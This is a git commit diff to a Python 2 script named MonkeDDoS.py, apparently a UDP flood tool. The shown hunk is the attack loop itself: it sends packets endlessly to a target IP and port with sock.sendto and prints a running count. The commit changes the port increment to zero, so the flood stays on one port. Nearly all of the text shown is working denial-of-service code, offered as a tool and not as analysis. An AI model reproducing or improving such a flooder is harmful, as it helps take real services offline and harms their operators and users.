88edf7122dc4b4629f8b7db832f46e3718a2dd63
SxlentGE <107578977+SxlentGE@users.noreply.github.com>
2023-05-08 21:20:17 +0400

    Update MonkeDDoS.py

--- MonkeDDoS.py
+++ MonkeDDoS.py
@@ -51,7 +51,7 @@ sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
-     port = port + 1
+     port = port + 0
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
